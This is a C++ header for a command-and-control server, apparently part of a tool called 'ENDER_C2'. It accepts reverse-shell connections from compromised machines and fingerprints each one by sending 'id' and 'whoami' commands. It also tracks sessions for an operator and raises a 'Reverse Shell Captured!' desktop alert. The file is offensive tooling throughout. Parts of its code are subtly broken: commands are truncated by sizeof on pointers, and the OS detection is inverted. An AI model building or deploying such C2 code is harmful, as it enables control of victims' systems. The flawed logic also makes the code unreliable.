#ifndef ENDER_C2_
#define ENDER_C2_
// This is a interface for the C2

#include <iostream>
#include <fstream>
#include <ctime>
#include <random>

#include <string>
#include <cstring>
#include <vector>
#include <cstdlib>
#include <chrono>
#include <thread>

#include <ifaddrs.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h> // for the struct timeval
#include <netinet/tcp.h> // for TCP_NODELAY

// global server variables

struct sockaddr_in server_address;
int server_socket;
bool serverShutDown = false;

// free function
void FetchShellUser(std::string& shellUser, const std::string& cmd, int& client_socket)
{
    // cmd already contains the new-line character
    const char* getUserCmd = cmd.c_str();
    ssize_t bytes_sent = 0, bytes_received = 0,
            total_bytes_received = 0, BUFFER_SIZE = 2048;
    std::vector<char> buffer(BUFFER_SIZE);

    // set socket timeout
    struct timeval timeout;
    timeout.tv_sec = 1;  // n seconds timeout (lets us escape recv loop)
    timeout.tv_usec = 0;
    
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // random /usr/bin is in the client_socket input, this fixes that issue
    bytes_sent = send(client_socket, "/whoami\n", sizeof("/whoami\n"), 0);
    if (bytes_sent == -1)
    {
        return;
    }

    // Loop to receive data from client until there's no more data
    total_bytes_received = 0;
    while ((bytes_received = recv(client_socket, buffer.data() + total_bytes_received,
            buffer.size() - total_bytes_received, 0)) > 0)
    {
        total_bytes_received += bytes_received;
    }

    // buffer clean
    buffer.clear();
    buffer.resize(BUFFER_SIZE);
    bytes_sent = 0, bytes_received = 0, total_bytes_received = 0;

    // send the target command to fetch the shell-user
    
    // send command to session
    bytes_sent = send(client_socket, getUserCmd, sizeof(getUserCmd), 0);
    if (bytes_sent == -1)
    {
        return;
    }

    // Loop to receive data from client until there's no more data
    while ((bytes_received = recv(client_socket, buffer.data() + total_bytes_received,
            buffer.size() - total_bytes_received, 0)) > 0)
    {
        total_bytes_received += bytes_received;
    }

    // null-terminator to assist in outstreaming data
    if (total_bytes_received < BUFFER_SIZE)
        buffer[total_bytes_received] = '\0';
    else
        buffer[BUFFER_SIZE-1] = '\0';

    // output the response to terminal
    if (total_bytes_received > (ssize_t)strlen(getUserCmd))
    {
        std::string commandOutput(buffer.data() + strlen(getUserCmd));
        shellUser = commandOutput.substr(0, commandOutput.find('\n'));
    }
}

// socket connection class
class ShellConnection
{
    public:
        ShellConnection(){};
        ShellConnection(int server_info)
        {
            // Accept a connection
            client_address_size = sizeof(client_address);
            client_socket = accept(server_info, (struct sockaddr *)&client_address, &client_address_size);

            if (client_socket == -1)
            {
                perror("accept");
            }

            // Usage TCP_NODELAY option to disable Nagle algorithm
            // allowing us to have faster packet send possibly
            int enable = 1;
            if (setsockopt(client_socket, IPPROTO_TCP, TCP_NODELAY, (const char*)&enable, sizeof(enable)) == -1)
            {
                perror("setsockopt");
                close(client_socket);
            }

            if (!serverShutDown)
            {
                // When Powershell doesnt know a command it throws
                // an error containing the substring
                // 'CommandNotFoundException'
                {
                    std::string shellcmd = "/usr/bin/id";
                    shellcmd += '\n'; // tells the shell connections End-Of-Command
                    const char* command = shellcmd.c_str();

                    // send command to session
                    ssize_t bytes_sent = send(client_socket, command, sizeof(command), 0);
                    if (bytes_sent == -1)
                    {
                        close(client_socket);
                        return;
                    }

                    std::vector<char> buffer(25);

                    // Loop to receive data from client until there's no more data
                    ssize_t total_bytes_received = 0;
                    ssize_t bytes_received = 0;

                    while ((bytes_received = recv(client_socket, buffer.data() + total_bytes_received,
                                    buffer.size() - total_bytes_received, 0)) > 0)
                    {
                        total_bytes_received += bytes_received;
                    }

                    // null-terminator to assist in outstreaming data
                    if (total_bytes_received < (ssize_t)buffer.size())
                    {
                        buffer[total_bytes_received] = '\0';
                    } else
                        {
                            buffer[buffer.size() - 1] = '\0';
                        }

                    // Exclude the command we send when displaying the recv
                    // buffer data on the terminal
                    if (total_bytes_received > (ssize_t)shellcmd.length())
                    {
                        std::string dataString(buffer.data());

                        if (dataString.find("bash") == 0)
                        {
                            sysOS = "Windows";
                        } else
                            {
                                sysOS = "Linux";
                            }
                    }
                }

                {
                    // send command to extract the shell-user
                    std::string shellcmd;
                    if (sysOS == "Windows")
                    {
                        shellcmd = "id";
                        shellcmd += '\n';
                    } else if (sysOS == "Linux")
                        {
                            shellcmd = "whoami";
                            shellcmd += '\n';
                        }

                    FetchShellUser(shellUser, shellcmd, client_socket);

                    
                    // For linux shells we need to add extra info
                    if (sysOS == "Linux")
                    {
                        char clientIP[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &(client_address.sin_addr), clientIP, INET_ADDRSTRLEN);

                        std::string shellIP(clientIP);
                        shellUser += "\\" + shellIP;
                    }
                }

                // creates a pop-up in the Linux desktop
                system("DD=$(date) && notify-send \"[+] Reverse Shell Captured! $DD\"");
            }
        };

        int GetSocket() { return client_socket; };
        std::string GetSocketOS() { return sysOS; };
        std::string GetShellUser() { return shellUser; };
    private:
        struct sockaddr_in client_address;
        socklen_t client_address_size;
        int client_socket;
        std::string sysOS = "Unknown", shellUser = "";
};

// This is a dynamic container used to store multiple
// sessions that are fetched by the Socket Server
std::vector<ShellConnection> sessions;

/*
   This when running created a central collector
   that handles shell sessions coming from external
   devices.

   The general set-up is all hosted inside local-terminal
   we can handle capturing multiple incoming sessions in
   the background when focused on a target system
*/

class CentralCore
{
    public:
        CentralCore()
        {
            LHOST = "127.0.0.1";
            LPORT = 19283;
        };

        int getCentralPort() { return LPORT; };
        std::string getCentralHost() { return LHOST; };
        void setCentralPort(int port_) { LPORT = port_; };
        void setCentralHost(std::string ip_) { LHOST = ip_; };

        void displayDevices()
        {
            for (size_t i = 0; i < sessions.size(); ++i)
            {
                std::cout << ":: " << i << " | " << sessions[i].GetShellUser();
                std::cout << "\\" << sessions[i].GetSocketOS() << "\n";
            }
        }

    private:
        int LPORT;
        std::string LHOST;
};

#endif
